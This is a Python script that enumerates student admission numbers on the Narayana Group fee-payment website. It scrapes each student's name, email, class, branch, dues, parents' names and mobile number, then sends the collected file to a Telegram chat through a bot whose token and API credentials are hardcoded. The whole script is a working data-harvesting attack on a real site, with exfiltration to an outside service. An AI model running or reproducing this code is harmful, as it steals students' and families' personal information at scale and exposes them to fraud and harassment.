from bs4 import BeautifulSoup
async def convert_time(seconds):
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    if hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    elif minutes > 0:
        return f"{minutes}m {seconds}s"
    else:
        return f"{seconds}s"
def generate(text):
    soup = BeautifulSoup(text, 'html.parser')
    std_name = soup.find("input",{"name":"ctl00$BodyContent$txtStudentName"}).get('value')
    std_email = soup.find("input",{"name":"ctl00$BodyContent$txtEmailAddress"}).get('value')
    std_class = soup.find("input",{"name":"ctl00$BodyContent$txtClassName"}).get('value')
    std_branch = soup.find("input",{"name":"ctl00$BodyContent$txtBranchName"}).get('value')
    std_due = soup.find("input",{"name":"ctl00$BodyContent$txtDueAmount"}).get('value')
    std_father_name = soup.find("input",{"name":"ctl00$BodyContent$txtFatherName"}).get('value')
    std_mother_name = soup.find("input",{"name":"ctl00$BodyContent$txtMotherName"}).get('value')
    std_mobile = soup.find("input",{"name":"ctl00$BodyContent$txtMobileNumber"}).get('value')
    std_material = soup.find("input",{"name":"ctl00$BodyContent$txtMaterialAmount"}).get('value')
    return std_name,std_email,std_class,std_branch,std_due,std_father_name,std_mother_name,std_mobile,std_material

def req2(admin,id,viewstate,viewstategenerator,eventvalidation):
    headers = {
    "authority": "feepay.narayanagroup.com",
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,te;q=0.8,tt;q=0.7",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "cookie": f"ASP.NET_SessionId={id}",
    "dnt": "1",
    "origin": "https://feepay.narayanagroup.com",
    "referer": "https://feepay.narayanagroup.com/",
    "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "x-microsoftajax": "Delta=true",
    "x-requested-with": "XMLHttpRequest"
    }
    data = {
    "ctl00$scriptManager": "ctl00$BodyContent$updStudentNumber|ctl00$BodyContent$btnSearchStudent",
    "__EVENTTARGET": "ctl00$BodyContent$btnSearchStudent",
    "__EVENTARGUMENT": "",
    "__VIEWSTATE": viewstate,
    "__VIEWSTATEGENERATOR": viewstategenerator,
    "__EVENTVALIDATION": eventvalidation,
    "ctl00$BodyContent$txtStudentNumber": admin,
    "__ASYNCPOST": "true"
    }
    return headers,data

import threading
from bs4 import BeautifulSoup
import requests
import time
import json
import pyrogram

verify = True
count = 0
lisk = []
lock = threading.Lock()

def count():
    print(count, end="\r")

def do_task(admin):
    global count, lisk
    url = "https://feepay.narayanagroup.com/"
    response = requests.get(url)
    cookies = response.cookies
    soup = BeautifulSoup(response.text, 'html.parser')
    viewstate = soup.find(id="__VIEWSTATE")['value']
    viewstategenerator = soup.find(id="__VIEWSTATEGENERATOR")['value']
    eventvalidation = soup.find(id="__EVENTVALIDATION")['value']
    set_cookie_header = response.headers.get("Set-Cookie")
    id = set_cookie_header.split(";")[0].split("=")[1]
    headers, data = req2(admin, id, viewstate, viewstategenerator, eventvalidation)
    response = requests.post(url, headers=headers, data=data, cookies=cookies)
    try:
        std_name, std_email, std_class, std_branch, std_due, std_father_name, std_mother_name, std_mobile, std_material = generate(response.text)
        json = {"admin_no":admin,"name": std_name ,"email": std_email ,"class": std_class ,"branch": std_branch,
                "due": std_due ,"father_name": std_father_name ,"mother_name": std_mother_name,
                "mobile": std_mobile,"material": std_material}

        with lock:
            lisk.append(json)
            count+=1
    except:
        pass

start = time.time()
threads = []
threading.Thread(target=count).start()
for i in range(1600000, 1600010):
    thread = threading.Thread(target=do_task, args=(i,))
    thread.start()
    threads.append(thread)


for thread in threads:
    thread.join()

print(round(time.time() - start))
with open('data.json', 'w') as outfile:
    json.dump(lisk, outfile)

import pyrogram
import asyncio
async def main():
    time_taken = await convert_time(time.time() - start)
    length = len(lisk)
    caption = f"Total Time Taken: `{time_taken}`\nTotal Students: `{length}`"
    bot = pyrogram.Client("my_account",bot_token="6135056131:AAGEo8Wrd2bTsKfLa1GHIZLmSWj6Tp2AMpk",api_id="1255820",api_hash="cdb18eb09e9caa9e7b3f5c62eb7e9685")
    await bot.start()
    await bot.send_document(chat_id=6251655151,document="data.json",file_name="Narayana_Student_Data.json",caption=caption)
    await bot.stop()

asyncio.get_event_loop().run_until_complete(main())